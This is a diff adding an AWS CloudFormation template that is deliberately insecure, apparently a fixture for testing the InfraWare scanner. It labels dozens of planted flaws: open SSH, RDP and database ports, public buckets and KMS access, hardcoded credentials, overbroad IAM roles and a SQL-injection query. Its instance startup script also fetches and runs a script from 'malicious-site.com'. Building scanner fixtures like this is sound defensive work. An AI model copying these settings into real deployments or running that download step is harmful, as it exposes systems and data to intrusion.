@@ -1,0 +1,381 @@
+# Complex Multi-Cloud Infrastructure with Security Vulnerabilities
+# This file contains intentional security issues for testing purposes
+
+AWSTemplateFormatVersion: '2010-09-09'
+Description: 'Complex multi-tier application with security vulnerabilities for InfraWare testing'
+
+Parameters:
+  Environment:
+    Type: String
+    Default: 'production'
+    AllowedValues: ['development', 'staging', 'production']
+  
+  DatabasePassword:
+    Type: String
+    Default: 'admin123'  # VULNERABILITY: Hardcoded password
+    NoEcho: false        # VULNERABILITY: Password not hidden
+
+Resources:
+  # VPC and Networking - Some misconfigurations
+  MainVPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: '10.0.0.0/16'
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: !Sub '${Environment}-main-vpc'
+
+  PublicSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref MainVPC
+      CidrBlock: '10.0.1.0/24'
+      AvailabilityZone: !Select [0, !GetAZs '']
+      MapPublicIpOnLaunch: true  # VULNERABILITY: Auto-assign public IPs
+
+  PrivateSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref MainVPC
+      CidrBlock: '10.0.2.0/24'
+      AvailabilityZone: !Select [0, !GetAZs '']
+
+  # Internet Gateway
+  InternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: !Sub '${Environment}-igw'
+
+  AttachGateway:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      VpcId: !Ref MainVPC
+      InternetGatewayId: !Ref InternetGateway
+
+  # Security Groups with vulnerabilities
+  WebServerSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: 'Web server security group with vulnerabilities'
+      VpcId: !Ref MainVPC
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 80
+          ToPort: 80
+          CidrIp: '0.0.0.0/0'  # OK for HTTP
+        - IpProtocol: tcp
+          FromPort: 443
+          ToPort: 443
+          CidrIp: '0.0.0.0/0'  # OK for HTTPS
+        - IpProtocol: tcp
+          FromPort: 22
+          ToPort: 22
+          CidrIp: '0.0.0.0/0'  # VULNERABILITY: SSH open to world
+        - IpProtocol: tcp
+          FromPort: 3389
+          ToPort: 3389
+          CidrIp: '0.0.0.0/0'  # VULNERABILITY: RDP open to world
+        - IpProtocol: '-1'     # VULNERABILITY: All protocols allowed
+          CidrIp: '10.0.0.0/8'
+
+  DatabaseSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: 'Database security group'
+      VpcId: !Ref MainVPC
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 3306
+          ToPort: 3306
+          CidrIp: '0.0.0.0/0'  # VULNERABILITY: Database open to world
+
+  # S3 Buckets with various security issues
+  PublicDataBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub '${Environment}-public-data-${AWS::AccountId}'
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: false       # VULNERABILITY: Public ACLs allowed
+        BlockPublicPolicy: false     # VULNERABILITY: Public policies allowed
+        IgnorePublicAcls: false      # VULNERABILITY: Public ACLs not ignored
+        RestrictPublicBuckets: false # VULNERABILITY: Public buckets not restricted
+      VersioningConfiguration:
+        Status: Suspended  # VULNERABILITY: Versioning disabled
+      BucketEncryption:
+        ServerSideEncryptionConfiguration:
+          - ServerSideEncryptionByDefault:
+              SSEAlgorithm: AES256  # VULNERABILITY: Not using KMS
+
+  PrivateDataBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub '${Environment}-private-data-${AWS::AccountId}'
+      # VULNERABILITY: No encryption specified
+      # VULNERABILITY: No public access block
+      LoggingConfiguration:
+        DestinationBucketName: !Ref LoggingBucket
+        LogFilePrefix: 'access-logs/'
+
+  LoggingBucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub '${Environment}-logs-${AWS::AccountId}'
+      # VULNERABILITY: Logging bucket not encrypted
+
+  # S3 Bucket Policy with overly permissive access
+  PublicBucketPolicy:
+    Type: AWS::S3::BucketPolicy
+    Properties:
+      Bucket: !Ref PublicDataBucket
+      PolicyDocument:
+        Statement:
+          - Sid: AllowPublicRead
+            Effect: Allow
+            Principal: '*'  # VULNERABILITY: Wildcard principal
+            Action: 
+              - 's3:GetObject'
+              - 's3:ListBucket'
+              - 's3:DeleteObject'  # VULNERABILITY: Public delete access
+            Resource: 
+              - !Sub '${PublicDataBucket}/*'
+              - !Ref PublicDataBucket
+
+  # EC2 Instances with security issues
+  WebServer1:
+    Type: AWS::EC2::Instance
+    Properties:
+      ImageId: 'ami-0c02fb55956c7d316'  # Amazon Linux 2
+      InstanceType: 't3.large'
+      SubnetId: !Ref PublicSubnet1
+      SecurityGroupIds:
+        - !Ref WebServerSecurityGroup
+      UserData:
+        Fn::Base64: !Sub |
+          #!/bin/bash
+          yum update -y
+          # VULNERABILITY: Installing software without verification
+          wget http://malicious-site.com/install.sh  # VULNERABILITY: HTTP download
+          chmod +x install.sh
+          ./install.sh
+          # VULNERABILITY: Hardcoded credentials in user data
+          mysql -h ${DatabaseInstance.Endpoint.Address} -u admin -padmin123
+      IamInstanceProfile: !Ref WebServerInstanceProfile
+      Monitoring: false  # VULNERABILITY: Detailed monitoring disabled
+      Tags:
+        - Key: Name
+          Value: !Sub '${Environment}-web-server-1'
+
+  WebServer2:
+    Type: AWS::EC2::Instance
+    Properties:
+      ImageId: 'ami-0c02fb55956c7d316'
+      InstanceType: 'm5.xlarge'
+      SubnetId: !Ref PublicSubnet1
+      SecurityGroupIds:
+        - !Ref WebServerSecurityGroup
+      # VULNERABILITY: No IAM role assigned
+      Tags:
+        - Key: Name
+          Value: !Sub '${Environment}-web-server-2'
+
+  # Database with security vulnerabilities
+  DatabaseSubnetGroup:
+    Type: AWS::RDS::DBSubnetGroup
+    Properties:
+      DBSubnetGroupDescription: 'Subnet group for RDS database'
+      SubnetIds:
+        - !Ref PrivateSubnet1
+        - !Ref PublicSubnet1  # VULNERABILITY: DB subnet in public subnet
+
+  DatabaseInstance:
+    Type: AWS::RDS::DBInstance
+    Properties:
+      DBInstanceIdentifier: !Sub '${Environment}-mysql-db'
+      DBInstanceClass: 'db.r5.large'
+      Engine: 'mysql'
+      EngineVersion: '5.7.44'  # VULNERABILITY: Older MySQL version
+      AllocatedStorage: 100
+      StorageType: 'gp2'
+      StorageEncrypted: false  # VULNERABILITY: Storage not encrypted
+      MasterUsername: 'admin'
+      MasterUserPassword: !Ref DatabasePassword  # VULNERABILITY: Weak password
+      VPCSecurityGroups:
+        - !Ref DatabaseSecurityGroup
+      DBSubnetGroupName: !Ref DatabaseSubnetGroup
+      BackupRetentionPeriod: 0     # VULNERABILITY: No backups
+      MultiAZ: false               # VULNERABILITY: No high availability
+      PubliclyAccessible: true     # VULNERABILITY: Database publicly accessible
+      DeletionProtection: false    # VULNERABILITY: No deletion protection
+      MonitoringInterval: 0        # VULNERABILITY: No enhanced monitoring
+
+  # IAM Roles and Policies with excessive permissions
+  WebServerRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub '${Environment}-web-server-role'
+      AssumeRolePolicyDocument:
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: ec2.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - 'arn:aws:iam::aws:policy/PowerUserAccess'  # VULNERABILITY: Excessive permissions
+      Policies:
+        - PolicyName: 'S3FullAccess'
+          PolicyDocument:
+            Statement:
+              - Effect: Allow
+                Action: 's3:*'    # VULNERABILITY: Wildcard S3 permissions
+                Resource: '*'     # VULNERABILITY: All resources
+
+  WebServerInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      Roles:
+        - !Ref WebServerRole
+
+  # Load Balancer
+  ApplicationLoadBalancer:
+    Type: AWS::ElasticLoadBalancingV2::LoadBalancer
+    Properties:
+      Name: !Sub '${Environment}-alb'
+      Type: 'application'
+      Scheme: 'internet-facing'
+      Subnets:
+        - !Ref PublicSubnet1
+      SecurityGroups:
+        - !Ref WebServerSecurityGroup
+
+  # CloudTrail with issues
+  CloudTrailS3Bucket:
+    Type: AWS::S3::Bucket
+    Properties:
+      BucketName: !Sub '${Environment}-cloudtrail-${AWS::AccountId}'
+      # VULNERABILITY: CloudTrail bucket not encrypted
+
+  CloudTrail:
+    Type: AWS::CloudTrail::Trail
+    Properties:
+      TrailName: !Sub '${Environment}-cloudtrail'
+      S3BucketName: !Ref CloudTrailS3Bucket
+      IncludeGlobalServiceEvents: false  # VULNERABILITY: Not logging global events
+      IsMultiRegionTrail: false          # VULNERABILITY: Single region only
+      EnableLogFileValidation: false     # VULNERABILITY: No log file validation
+
+  # Lambda function with security issues
+  LambdaExecutionRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - 'arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole'
+        - 'arn:aws:iam::aws:policy/AmazonS3FullAccess'  # VULNERABILITY: Excessive permissions
+
+  ProcessingFunction:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub '${Environment}-data-processor'
+      Runtime: 'python3.9'  # VULNERABILITY: Older Python version
+      Handler: 'index.handler'
+      Role: !Ref LambdaExecutionRole
+      Code:
+        ZipFile: |
+          import json
+          import os
+          import boto3
+          
+          # VULNERABILITY: Hardcoded credentials
+          aws_access_key = 'AKIAIOSFODNN7EXAMPLE'
+          aws_secret_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
+          
+          def handler(event, context):
+              # VULNERABILITY: No input validation
+              user_input = event['user_data']
+              # VULNERABILITY: Potential SQL injection
+              query = f"SELECT * FROM users WHERE name = '{user_input}'"
+              return {'statusCode': 200}
+      Environment:
+        Variables:
+          DB_PASSWORD: 'admin123'  # VULNERABILITY: Sensitive data in environment
+          API_KEY: 'sk-1234567890abcdef'  # VULNERABILITY: Hardcoded API key
+      ReservedConcurrencyLimit: 1000
+
+  # ElastiCache cluster without encryption
+  CacheSubnetGroup:
+    Type: AWS::ElastiCache::SubnetGroup
+    Properties:
+      Description: 'Cache subnet group'
+      SubnetIds:
+        - !Ref PrivateSubnet1
+
+  CacheCluster:
+    Type: AWS::ElastiCache::CacheCluster
+    Properties:
+      CacheNodeType: 'cache.r5.large'
+      Engine: 'redis'
+      NumCacheNodes: 1
+      CacheSubnetGroupName: !Ref CacheSubnetGroup
+      # VULNERABILITY: No encryption at rest
+      # VULNERABILITY: No encryption in transit
+
+  # EBS Volume without encryption
+  UnencryptedVolume:
+    Type: AWS::EC2::Volume
+    Properties:
+      Size: 100
+      VolumeType: 'gp3'
+      AvailabilityZone: !Select [0, !GetAZs '']
+      Encrypted: false  # VULNERABILITY: Volume not encrypted
+      Tags:
+        - Key: Name
+          Value: !Sub '${Environment}-unencrypted-volume'
+
+  # KMS Key with overly permissive policy
+  KMSKey:
+    Type: AWS::KMS::Key
+    Properties:
+      Description: 'KMS key for encryption'
+      KeyPolicy:
+        Statement:
+          - Sid: 'Allow administration'
+            Effect: Allow
+            Principal:
+              AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:root'
+            Action: 'kms:*'
+            Resource: '*'
+          - Sid: 'Allow public access'  # VULNERABILITY: Public KMS access
+            Effect: Allow
+            Principal: '*'
+            Action:
+              - 'kms:Decrypt'
+              - 'kms:GenerateDataKey'
+            Resource: '*'
+
+Outputs:
+  VPCId:
+    Description: 'VPC ID'
+    Value: !Ref MainVPC
+    Export:
+      Name: !Sub '${Environment}-vpc-id'
+
+  DatabaseEndpoint:
+    Description: 'Database endpoint'
+    Value: !GetAtt DatabaseInstance.Endpoint.Address
+    Export:
+      Name: !Sub '${Environment}-db-endpoint'
+
+  LoadBalancerDNS:
+    Description: 'Load balancer DNS name'
+    Value: !GetAtt ApplicationLoadBalancer.DNSName
+    Export:
+      Name: !Sub '${Environment}-alb-dns'
